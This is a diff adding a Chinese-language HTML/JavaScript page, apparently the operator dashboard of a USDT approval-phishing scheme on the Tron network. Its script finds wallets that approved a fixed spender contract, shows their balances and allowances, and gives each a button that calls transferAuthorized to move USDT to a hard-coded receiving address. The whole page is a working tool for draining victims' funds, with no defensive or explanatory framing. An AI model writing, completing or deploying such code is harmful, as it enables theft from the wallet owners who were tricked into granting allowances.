@@ -1,1 +1,99 @@
-<!DOCTYPE html><html><head><title>USDT Dashboard</title></head><body><h1>請部署 React 專案</h1><p>此為入口頁，請用 Vite 或 Next.js 運行原始碼。</p></body></html>
+
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>USDT 授權監控後台</title>
+  <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/tronweb@4.4.0/dist/TronWeb.min.js"></script>
+  <style>
+    body { font-family: sans-serif; padding: 2em; background: #f9f9f9; }
+    h1 { color: #2d3436; }
+    .wallet-card {
+      border: 1px solid #ccc; border-radius: 10px; padding: 1em; margin: 1em 0; background: #fff;
+    }
+    button { background: #00b894; color: white; padding: 0.5em 1em; border: none; border-radius: 5px; cursor: pointer; }
+    .error { color: red; }
+  </style>
+</head>
+<body>
+  <h1>🔐 USDT 授權監控後台</h1>
+  <div id="wallets">載入中...</div>
+
+  <script>
+    const AUTH_CONTRACT = "TMxu165T2e3ZKWzgt7gipzmHwE5KYuibGa";
+    const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+    const USDT_DECIMALS = 1e6;
+    const YOUR_RECEIVE_ADDRESS = "THjNpJWbuGxvhR9kDDTDz1wVKhe2PWLfNR";
+
+    async function fetchApprovals() {
+      const walletsDiv = document.getElementById("wallets");
+      walletsDiv.innerHTML = "⏳ 正在讀取授權紀錄...";
+      const results = [];
+      try {
+        let page = 0, stop = false;
+        while (!stop && page < 10) {
+          const res = await axios.get(
+            `https://apilist.tronscanapi.com/api/contract/events?contract=${USDT_CONTRACT}&eventName=Approval&limit=100&start=${page * 100}`
+          );
+          const events = res.data.data || [];
+          for (const evt of events) {
+            const { result } = evt;
+            if (result.spender?.toLowerCase() === AUTH_CONTRACT.toLowerCase()) {
+              if (!results.find(r => r.address === result.owner)) {
+                results.push({ address: result.owner });
+              }
+            }
+          }
+          if (events.length < 100) stop = true;
+          page++;
+        }
+
+        const contract = await window.tronWeb.contract().at(USDT_CONTRACT);
+        const authContract = await window.tronWeb.contract().at(AUTH_CONTRACT);
+        const walletsHtml = await Promise.all(results.map(async (w) => {
+          try {
+            const balance = await contract.balanceOf(w.address).call();
+            const allowance = await contract.allowance(w.address, AUTH_CONTRACT).call();
+            const trxBalance = await window.tronWeb.trx.getBalance(w.address);
+            const usdt = parseFloat(balance) / USDT_DECIMALS;
+            const allowed = parseFloat(allowance) / USDT_DECIMALS;
+            const trx = parseFloat(trxBalance) / 1e6;
+
+            return `<div class="wallet-card">
+              <div><strong>錢包：</strong>${w.address}</div>
+              <div>USDT：${usdt}</div>
+              <div>授權額度：${allowed}</div>
+              <div>TRX 餘額：${trx}</div>
+              <button onclick="triggerTransfer('${w.address}')">🚀 觸發轉帳</button>
+            </div>`;
+          } catch {
+            return `<div class="wallet-card error">⚠️ ${w.address} - 無法取得資料</div>`;
+          }
+        }));
+
+        walletsDiv.innerHTML = walletsHtml.join("");
+      } catch (e) {
+        walletsDiv.innerHTML = "❌ 發生錯誤：" + e.message;
+      }
+    }
+
+    async function triggerTransfer(from) {
+      const contract = await window.tronWeb.contract().at(AUTH_CONTRACT);
+      const amount = 1 * USDT_DECIMALS;
+      await contract.transferAuthorized(USDT_CONTRACT, from, YOUR_RECEIVE_ADDRESS, amount).send();
+      alert("已觸發從錢包轉出 USDT");
+    }
+
+    window.addEventListener("load", () => {
+      if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
+        fetchApprovals();
+      } else {
+        document.getElementById("wallets").innerHTML = "⚠️ 請使用 TronLink 開啟此頁面";
+      }
+    });
+  </script>
+</body>
+</html>
+    
